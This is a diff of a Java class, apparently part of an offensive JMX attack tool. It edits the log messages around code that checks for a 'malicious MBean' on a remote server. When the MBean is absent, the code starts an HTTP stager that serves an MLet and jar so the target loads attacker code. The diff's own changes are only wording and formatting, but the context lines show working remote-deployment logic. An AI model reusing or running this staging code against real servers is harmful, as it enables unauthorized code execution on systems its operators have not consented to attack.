@@ -233,7 +233,7 @@ public class GreenGrocer {
         try {
             /* If the malicious Bean is already registered, we are done */
             if( this.mBeanServer.isRegistered(this.beanName) ) {
-                Logger.println_ye("Malicious MBean seems already be registered");
+                Logger.println_ye("Malicious MBean seems already be registered.");
                 return;
 
             /* Otherwise we have to create it */
@@ -241,14 +241,14 @@ public class GreenGrocer {
                 try {
                     /* The server may already knows the codebase and registration is done right here */
                     mBeanServer.createMBean(this.beanClass, this.beanName);
-                    Logger.println("Malicious Bean is not registered, but known by the server");
+                    Logger.println("Malicious MBean is not registered, but known by the server.");
                     Logger.println("Instance created!");
                     return;
 
                 } catch( Exception e ) {
                     /* More likely is, that we have to deploy the Bean over our HTTP listener */
-                    Logger.println("Malicious Bean seems not to be registered on the server");
-                    Logger.println("Starting registration process");
+                    Logger.println("Malicious MBean seems not to be registered on the server.");
+                    Logger.println("Starting registration process:");
                     Logger.increaseIndent();
                 }
             }
@@ -265,18 +265,19 @@ public class GreenGrocer {
                                   );
 
             /* If we did not started the server we can stop it here */
-            if( ! remoteStager )
+            if( ! remoteStager ) {
                 payloadServer.stop(0);
+            }
 
             Logger.decreaseIndent();
 
             /* At this stage the bean should have bean registered on the server */
             if( mBeanServer.isRegistered(this.beanName) ) {
-                Logger.println("malicious Bean was successfully registered");
+                Logger.println("Malicious MBean was successfully registered.");
 
             /* Otherwise something unexpected has happened */
             } else {
-                Logger.eprintln("malicious Bean does still not exist on the server");
+                Logger.eprintln("Malicious MBean does still not exist on the server.");
                 Logger.increaseIndent();
                 Logger.eprintln("Registration process failed.");
                 Logger.eprint("The following object was returned:");
@@ -327,7 +328,7 @@ public class GreenGrocer {
         } catch( javax.management.InstanceNotFoundException e ) {
             Logger.eprint("MBean ");
             Logger.eprintPlain_ye(e.getMessage());
-            Logger.eprintlnPlain(" not found on the server. ");
+            Logger.eprintlnPlain(" not found on the server.");
             Logger.increaseIndent();
             Logger.eprintln("Did you forget to deploy?");
             this.disconnect();
@@ -441,26 +442,28 @@ public class GreenGrocer {
 
             /* First we create a new HttpServer object */
             server = HttpServer.create(new InetSocketAddress(bindAddress, Integer.valueOf(bindPort)), 0);
-            Logger.print("Creating HTTP server on ");
+            Logger.print("Creating HTTP server on: ");
             Logger.printlnPlain_bl(bindAddress + ":" + bindPort);
 
             Logger.increaseIndent();
 
             /* Then we register an MLetHandler for requests on the endpoint /mlet */
-            Logger.print("Creating MLetHandler for endpoint ");
+            Logger.print("Creating MLetHandler for endpoint: ");
             Logger.printlnPlain_bl("/mlet");
             server.createContext("/mlet", new MLetHandler(stagerHost, stagerPort, this.beanClass, this.jarName, this.objectName));
 
             /* Then we register a jar handler for requests that target our jarName */
-            Logger.print("Creating JarHandler for endpoint ");
+            Logger.print("Creating JarHandler for endpoint: ");
             Logger.printlnPlain_bl("/" + this.jarName);
             server.createContext("/" + this.jarName, new JarHandler(this.jarName, this.jarPath));
 
             server.setExecutor(null);
 
-            Logger.println("Starting the HTTP server... ");
+            Logger.println("Starting HTTP server... ");
             Logger.println("");
             server.start();
+
+            Logger.decreaseIndent();
 
         } catch (Exception e) {
             Logger.eprint("The following exception was thrown: ");
